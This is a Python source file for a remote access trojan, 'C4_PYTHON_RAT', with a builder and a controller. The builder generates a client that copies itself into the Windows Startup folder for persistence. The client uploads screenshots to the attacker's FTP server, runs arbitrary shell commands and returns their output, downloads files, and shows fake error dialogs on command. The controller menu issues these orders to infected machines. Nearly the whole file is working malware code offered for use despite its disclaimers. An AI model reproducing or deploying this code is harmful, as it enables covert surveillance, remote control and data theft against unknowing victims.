
# C4_PYTHON_RAT

# Made by cr4sh3r



import os, ftplib, time, wget, random, urllib2
import progressbar
from  distutils.core import setup

lk = 0

# Decorations

art1 = """
              _,     _   _     ,_
          .-'` /     *****     \ `'-.
         /    |      |   |      |    *
        ;      \_  _/     \_  _/      ;
       |         ``         ``         |
       |            cr4sh3r            |
        ;    .-.   .-.   .-.   .-.    ;
         \  (   '.'   \ /   '.'   )  /
          '-.;         V         ;.-'
              `                 `

              c4.Python.Rat"""

art2 = """
      (                      )
      |\    _,--------._    / |
      | `.,'            `. /  |
      `  '   cr4sh3r    ,-'   '
       \/_         _   (     /       I'm watching all
      (,-.`.    ,',-.`. `__,'        this crap you're
       |/#\ ),-','#\`= ,'.` |        doing!
       `._/)  -'.\_,'   ) ))|        HEHEHEHE...
       /  (_.)\     .   -'//
      (  /\____/\    ) )`'*
       \ |V----V||  ' ,    *
        |`- -- -'   ,'   \  \      _____
 ___    |         .'    \ \  `._,-'     `-
    `.__,`---^---'       \ ` -'
       -.______  \ . /  ______,-
             c4.Python.Rat
               `.     ,'
"""


art3= """
        ___               _   _                             _
       /   |             | | | |                           | |
  ___ / /| |  _ __  _   _| |_| |__   ___  _ __    _ __ __ _| |_
 / __/ /_| | | '_ \| | | | __| '_ \ / _ \| '_ \  | '__/ _` | __|
| (__\___  | | |_) | |_| | |_| | | | (_) | | | | | | | (_| | |_
 \___|   |_/ | .__/ \__, |\__|_| |_|\___/|_| |_| |_|  \__,_|\__|
             | |     __/ |
             |_|    |___/               cr4sh3r                   """

art4 = """
                                 o#'9MMHb':'-,o,
                              .oH":HH$' "' ' -*R&o,
                             dMMM*""'`'      .oM"HM?.
                           ,MMM'          "HLbd< ?&H*       HACK THE PLANET!
                          .:MH ."\          ` MM  MM&b      c4.Python.Rat
                         . "*H    -        &MMMMMMMMMH:     CR4SH3R
                         .    dboo        MMMMMMMMMMMM.
                         .   dMMMMMMb      *MMMMMMMMMP.
                         .    MMMMMMMP        *MMMMMP .
                              `#MMMMM           MM6P ,
                          '    `MMMP"           HM*`,
                           '    :MM             .- ,
                            '.   `#?..  .       ..'
                               -.   .         .-
                                 ''-.oo,oo.-''
                                 """


art5 = """
              ____________________________________________________
            /                                                     |
           |    _____________________________________________     |
           | C |                                             |    |
           | R |  C:\> _                                     |    |
           | 4 |                                             |    |
           | S |                                             |    |
           | H |                                             |    |
           | 3 |                                             |    |
           | R |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                    c4.Python.Rat                     |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'"""


art6 = """
  _______________________________
 /\                              *
/++\    __________________________*
\+++\   \ ************************/
 \+++\   \___________________ ***/
  \+++\   \             /+++/***/
   \+++\   \           /+++/***/
    \+++\   \         /+++/***/
     \+++\   \       /+++/***/
      \+++\   \     /+++/***/
       \+++\   \   /+++/***/
        \+++\   \ /+++/***/
         \+++\   /+++/***/
          \+++\ /+++/***/
           \+++++++/***/
            \+++++/***/
             \+++/***/
              \+/___/
         c4.Python.Rat
         CR4SH3R"""




art7 = """
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMds+:--------:+sdNMMMMMMMMMMM
MMMMMMMMms:-+sdNMMMMMMMMNdy+--omMMMMMMMM
MMMMMMh:` /mMMMMMMMMMMMMMMMMm+ `-yMMMMMM
MMMMd--hN``--sNMMMMMMMMMMNy:..`md:.hMMMM
MMM+`yMMMy hd+./hMMMMMMh/.+dd sMMMh`/MMM
MM:.mMMMMM:.NMMh/.+dd+./hMMM--MMMMMm--NM
M+`mMMMMMMN`+MMMMm-  .dMMMMo mMMMMMMN.:M
d yMMMMMMMMy dNy:.omNs--sNm oMMMMMMMMh h
/`MMMMMMMMMM.`.+dMMMMMMm+.``NMMMMMMMMM-:
.:MMMMMMMd+./`oMMMMMMMMMMs /.+dMMMMMMM/`
.:MMMMmo.:yNMs dMMMMMMMMm`oMNy:.omMMMM/`
/`MNy:.omMMMMM--MMMMMMMM:.MMMMMNs--sNM.:
d -` :++++++++: /++++++/ :++++++++:  : h
M+ yddddddddddd+ yddddy /dddddddddddy`/M
MM/.mMMMMMMMMMMM.-MMMM/.NMMMMMMMMMMm.:NM
MMMo`sMMMMMMMMMMd sMMy hMMMMMMMMMMy`+MMM
MMMMd--hMMMMMMMMM+`mN`/MMMMMMMMMh--hMMMM
MMMMMMh:.omMMMMMMN.:/`NMMMMMMms.:hMMMMMM
MMMMMMMMNs:./shmMMh  yMMNds/.:smMMMMMMMM
MMMMMMMMMMMMdy+/---``---:+sdMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
c4.Python.Rat
CR4SH3R"""


art8 = """

               .-''-''-.
              /   '-'  .: __      c4.Python.Rat
      .._    /  /|||||  Y`  `/
     |:  `-.J  /__ __.., )   |
     |  .   ( ( ==|<== : )   |
     :   `.(  )\ _L__ /( )   |
      \    \(  )|\__//(  )   |
       \    \  ):`'':(  /    |
        -_   -.-   .'-'` ` . |
         `. :           .  ' :
          )            :    /
         /    : /   _   :  :
        @)    : |  (@)  | :
         \   /   \     / /
          `i`     `---' /
           |           (
           |           |
          /   )         |
         |               |
         |                |
         \                |
         |    __          |
         |    |#\ /        |
cr4sh3r  |     \#Y         |
         |       |        /"""

art9 = """
                                SPECIAL THANKS TO:
                         | R9, Vini_Nazi, VXHeaven, Pix|
                   _____ | St0rm, Glac, Kr0n0$, Leey   |_____
                         | InurlBrasil, J-Astolfo, Kane|
                   _____ | DoSNUT,Murdok,Booster,Kurono|_____
                         | Jh00n,BakuninM4lvadao, Xandi|
                         """


art10 = """
  _________________________
     ||   ||     ||   ||
     ||   ||, , ,||   ||    TAKE A WRONG STEP AND YOU MAY
     ||  (||/|/(\||/  ||    END UP IN HERE!
     ||  ||| _'_`|||  ||
     ||   || o o ||   ||
     ||  (||  - `||)  ||
     ||   ||  =  ||   ||
     ||   ||\___/||   ||
     ||___||) , (||___||
    /||---||-\_/-||---||
   / ||--_||_____||_--||
  (_(||)-| 1234567 |-(||)_)"""



# Make decorations random

artfin = random.choice([art1,art2,art3,art4,art5,art6,art7,art8,art9,art10])

print artfin

print "Now properly commented!"
print " "
print "Version 1.0.5"
print "- - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
print "Made by cr4sh3r"
print "This may be not the final version!"

print "USE ME CORRECTLY! " \
      "ILLEGAL ACTIONS HAVE THEIR CONSEQUENCES!"
print "- - - - - - - - - - - - - - - - - - - - - - - - - - - - -"

print "Choose an option:"
print "2 - Builder"
print "1 - Controller"
print "0 - Help"
print "Press E to exit"

# Building function
# This function structure is not necessary
# We're working on a class structure...

def startfun2(n):
    print "Make sure you've got python 2.7 and pyinstaller installed!"
    print "Make sure the pyinstaller dir is C:\Python27\PyInstaller-2.1"
    print "Some extra modules may be required"
    print "- - - - - - - - - - - - "
    print "Made by cr4sh3r"
    print "This may be not the final version!"
    print "- - - - - - - - - - - - "

    # Configure FTP details
    raw_input("Press Enter to continue...")
    print "Configure ftp host"
    print "EXAMPLE: ftp.example.com"
    vir_host = raw_input("HOST:")
    print "EXAMPLE: user"
    vir_logi = raw_input("Username:")
    print "EXAMPLE: 1234"
    vir_pasi = raw_input("Password:")
    print "Give me your file a name"
    print "EXAMPLE: test"
    vir_fn = raw_input("File_name:")
    print "Give me your pc id"
    print "EXAMPLE: 01"
    vir_vicid =  raw_input("ID:")
    print "Give me your URL"
    print "EXAMPLE: example.com"
    vir_myurl = raw_input("URL:")
    # Here the building process starts
    
    build = open(vir_fn + ".txt" , 'w')
    finatcomp = vir_fn + ".txt"

    # Code is represented as a string
    
    vir_code = '''import os, time, webbrowser, pyHook, pythoncom, sys, logging, wget
import getpass, ctypes, random, inspect, PIL.ImageGrab, ftplib, urllib, urllib2, subprocess

# START-UP

# FTP credentials

vir_host = ''' + '\'' + vir_host + '\'' + '''
vir_logi = ''' + '\'' + vir_logi + '\'' + '''
vir_pasi = ''' + '\'' + vir_pasi + '\'' + '''
vir_vicid = ''' + '\'' + vir_vicid + '\'' + '''
vir_myurl = ''' + '\'' + vir_myurl + '\'' + '''

# Not important variable - this will be changed later
nigga = 0

# This variables are used to make the client start with the computer
quest = getpass.getuser()
test = os.getcwd()
filen = '\\\"' + sys.argv[0] + '\\\"'
start =  "\\\"C:\Users" + '\\\\' + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\\\\\""
start2889 =  "C:\Users"  + "\\\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
test2 = os.getcwd()

# Avoids crashing after the second initialization
if test2 == start2889:
     ctypes.windll.user32.MessageBoxA(0, "ERROR 49, ERROR!", "ERROR!", 1)

# Copies content to the win startup folder
else:
     startupcom = "copy " +  filen + " " + start
     os.system(startupcom)
     time.sleep(5)

time.sleep(3)

# What to do?

# Infinite loop
while nigga <= 1:
    
    # Collects the instructions
    urlupda = "http://" + vir_myurl + "/wtd/" + vir_vicid + "/asno.html"
    f = urllib.urlopen(urlupda)
    updater = f.readline(1)
    time.sleep(05)

    # Does nothing
    while updater == "1":
        time.sleep(05)
        # These loops (update loops) make the client execute new instructions 
        for updater in range(1):
            f = urllib.urlopen(urlupda)
            updater = f.readline(1)
            time.sleep(5)


    # Responsible for the screenlog feature
    while updater == "2":
                #Screen_log
                bitmap = PIL.ImageGrab.grab()
                # Saves the pic
                start2469 = "C:\Users" + "\\\\" + quest + "\\\\Pictures" + "\\\\" + "2469.jpg"
                bitmap.save(start2469)
                n5 = "2469"
                # Uploads the picture to your server
                ftp = ftplib.FTP(vir_host, vir_logi , vir_pasi)
                ftp.cwd('public_html')
                ftp.cwd('images')
                ftp.cwd(vir_vicid)
                filez = open(start2469 , 'rb')
                name6 = str(n5)+".jpg"
                time.sleep(5)
                # Don't screw this up!
                try:
                    try:
                        f = open(start2469, "rb")
                        name= str(n5)+".jpg"
                        # Uploads the pic
                        ftp.storbinary('STOR ' + name, f)
                        f.close()
                    finally:
                        ftp.quit()
                except:
                    traceback.print_exc()

                time.sleep(30)
                # Update loop (as mentioned before)
                for updater in range(1):
                    f = urllib.urlopen(urlupda)
                    updater = f.readline(1)
                    time.sleep(5)

    
    # Responsible for the CMD feature
    while updater == "3":
        #CMD
        for updatz5 in range(1):
            # Connects to the server
            ftp = ftplib.FTP(vir_host, vir_logi , vir_pasi)
            ftp.cwd('public_html')
            ftp.cwd('cmd')
            ftp.cwd(vir_vicid)
            # Reads the instructions
            urlup5 = "http://" + vir_myurl + "/cmd/" + vir_vicid + "/aat.js"
            usock = urllib2.urlopen(urlup5)
            updatz5 = usock.read()
            usock.close()
            # Gives the user more time
            if updatz5 == "":
                time.sleep(5)
            # Solve errors related to spelling mistakes
            try:
                command = subprocess.check_output(updatz5, shell=True)
            except:
                time.sleep(03)
            time.sleep(1)
            # Returns the command's response to the controller
            ansa = open("tpo.js" , 'w')
            ansa.write(command)
            ansa.close()
            ftp.storbinary("STOR tpo.js", open("tpo.js", "rb"))
            time.sleep(6)
            ftp.quit()
        
        # Update loop (as mentioned before)
        for updater in range(1):
            f = urllib.urlopen(urlupda)
            updater = f.readline(1)
            time.sleep(5)
    
    # Responsible for the message feature
    while updater == "4":
        for updat6 in range(1):
            # Reads the message
            urlup5 = "http://" + vir_myurl + "/dm/" + vir_vicid + "/bling.js"
            usock = urllib2.urlopen(urlup5)
            updat6 = usock.read()
            usock.close()
            # Shows the message
            ctypes.windll.user32.MessageBoxA(0, updat6 , "ERROR!", 1)
            time.sleep(10)
        
        # Update loop (as mentioned before)
        for updater in range(1):
            f = urllib.urlopen(urlupda)
            updater = f.readline(1)
            time.sleep(5)
    
    # Responsible for the download feature
    while updater == "5":
        time.sleep(05)
        # Reads the instruction
        for updat6z in range(1):
            urlup5 = "http://" + vir_myurl + "/df/" + vir_vicid + "/blong.js"
            usock = urllib2.urlopen(urlup5)
            updat6z = usock.read()
            usock.close()
            # Download the file
            wget.download(updat6z)
            time.sleep(10)

        # Update loop (as mentioned before)
        for updater in range(1):
            f = urllib.urlopen(urlupda)
            updater = f.readline(1)
            time.sleep(5)
    
    # Avoids errors
    else:
        time.sleep(05)
        for updater in range(1):
            f = urllib.urlopen(urlupda)
            updater = f.readline(1)
            time.sleep(5)


exit()
'''
    # Related to the building process
    build.write(vir_code)
    time.sleep(05)
    finatcomp2 = vir_fn + ".py"
    test2 = os.getcwd()
    build.close()
    os.rename(vir_fn + ".txt", vir_fn + ".py")
    time.sleep(05)
    # Moves the source to your pyinstaller dir
    d5 = "move " + vir_fn + ".py" + " " + "C:\Python27\PyInstaller-2.1"
    print 'Example: C:\Users\\test\\Desktop\kal.ico'
    # Gives the client an icon
    icn = raw_input("ICON PATH:")
    # Command used by the compiler
    c6 = "python C:\Python27\PyInstaller-2.1\pyinstaller.py --onefile -w " + "-i " + icn + " C:\Python27\PyInstaller-2.1\\" + vir_fn + ".py"
    e9 = "echo finished"
    # Fancy progress bar mechanism
    bar = progressbar.ProgressBar()
    a = [d5 , c6, e9]
    for b in bar(range(2)):
        time.sleep(03)
        a = [d5 , c6, e9]
        k = b
        j = a[b]
        os.system(j)
        print ""
    # The building process has successfully finished
    time.sleep(05)
    raw_input("...")
    # Some advices
    print "Run the RAT as an ADM!"
    print "Only use it with authorization!"
    print "0 - Help"
    raw_input("PRESS ENTER TO CONTINUE...")
    
    return n

# Controlling function
def ftp_con(m):
    # Configures the FTP credentials
    print 'Example: ftp.example.com'
    f_host = raw_input("FTP HOST:")
    print "Example: http://www.example.com"
    f_host_url = raw_input("HOST_URL:")
    logi = raw_input("Username:")
    pasi = raw_input("Password:")
    # Enters the server
    ftp = ftplib.FTP(f_host, logi , pasi)
    # Fancy message
    print ftp.getwelcome()
    # Infinite loop
    while m <= 1:
        # Some advices...
        print "LI to list images"
        print "C to acquire CMD control"
        print "DM to display message"
        print "DF to download a file"
        print "CB to control the BOT - Do it first!"
        ftp_com = raw_input(">>>")
        # Checks what was your choice
        # List pictures captured by the bot
        if ftp_com == "LI":
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            # Goes to the right path
            ftp.cwd('public_html')
            ftp.cwd('images')
            ftp.cwd(vic_id)
            # Lists the available files
            print "Images:"
            log = []
            ftp.retrlines('LIST', callback=log.append)
            files = (line.rsplit(None, 1)[1] for line in log)
            files_list = list(files)
            print  files_list
            # Downloads the pic
            print "Choose a file to download:"
            fil_down = raw_input(">>>")
            wget.download(f_host_url + "/images" + "/" + vic_id + "/" + fil_down)
            # Returns to the main path
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        # Responsible for sending commands to the bot
        elif ftp_com == "C":
            # Goes to the right path
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd('public_html')
            ftp.cwd('cmd')
            ftp.cwd(vic_id)
            # Advices...
            print "Commands may take awhile to respond!"
            print "What do you want me to do?"
            print "EXAMPLE: start notepad.exe "
            vic_com = raw_input(">>>")
            # Save your commands and then upload them
            aga = open("aat.js" , 'w')
            aga.write(vic_com)
            aga.close()
            ftp.storbinary("STOR aat.js", open("aat.js", "rb"))
            time.sleep(5)
            #  Reads the command's response
            print "Result:"
            urlup78 = f_host_url + "/cmd/" + vic_id + "/tpo.js"
            usock = urllib2.urlopen(urlup78)
            updatz79 = usock.read()
            usock.close()
            time.sleep(1)
            print updatz79
            print " "
            print " "
            # Makes the commands be executed only once
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd('public_html')
            ftp.cwd('wtd')
            ftp.cwd(vic_id)
            asno = open("asno.html" , 'w')
            asno.write("1")
            asno.close()
            ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
            # Returns to the main path
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")


        # Tells the bot what to do
        elif ftp_com == "CB":
            # Goes to the right path
            ftp.cwd('public_html')
            ftp.cwd('wtd')
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd(vic_id)
            # Advices...
            print "What do you want me to do?"
            print "1 - Rest"
            print "2 - Screenlog"
            print "3 - Cmd_control"
            print "4 - Display message"
            print "5 - Download file"
            bot_com = raw_input(">>>")
            # Uploads the instructions
            asno = open("asno.html" , 'w')
            asno.write(bot_com)
            asno.close()
            ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
            time.sleep(5)
            print "The bot is now executing option " + bot_com
            # Returns to the main path
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")
        
        # Displays some messages
        elif ftp_com == "DM":
            # Goes to the right path
            ftp.cwd('public_html')
            ftp.cwd('dm')
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd(vic_id)
            # Advice
            print 'Write your message'
            me_com = raw_input('>>>')
            # Uploads the message
            mec = open("bling.js" , 'w')
            mec.write(me_com)
            mec.close()
            ftp.storbinary("STOR bling.js", open("bling.js" , 'rb'))
            time.sleep(5)
            # Returns to the main path
            print "The bot is now showing " + me_com
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        # Downloads files
        elif ftp_com == "DF":
            # Goes to the right path
            ftp.cwd('public_html')
            ftp.cwd('df')
            print "Insert computer ID"
            print "EXAMPLE: 01 "
            vic_id = raw_input(">>>")
            ftp.cwd(vic_id)
            # Advice
            print 'Tell the bot what to download'
            print 'Ex: http://i.imgur.com/m6a0Vrm.jpg'
            # Uploads the instructions
            mez_com = raw_input('>>>')
            mez = open("blong.js" , 'w')
            mez.write(mez_com)
            mez.close()
            ftp.storbinary("STOR blong.js", open("blong.js" , 'rb'))
            time.sleep(5)
            print "The bot is now downloading " + mez_com
            # Returns to the main path
            ftp.cwd("../")
            ftp.cwd("../")
            ftp.cwd("../")

        # Avoids errors related to spelling mistakes
        else:
            print "ERROR"
            raw_input()


    return m

kfckl = 0

# Infinite loop
while 1 >= kfckl :

    # Reads the chosen option
    starter = raw_input(">>>")

    if starter == '1':
        ftp_con(lk)

    elif starter == '2':
        startfun2(lk)

    # Advices
    elif starter == "0":
        print "2 - Builder"
        print "1 - Controller"
        print "0 - Help"
        print "Press E to exit"

    # Closes the program
    elif starter == "E":
        raw_input("Press ENTER to exit")
        exit()
    # Avoids errors related to spelling mistakes
    else:
        print "Error!"
        print "Press 0 to open the help menu"
        raw_input("...")


# THE END


# Preserve the main author if you're going to change the code

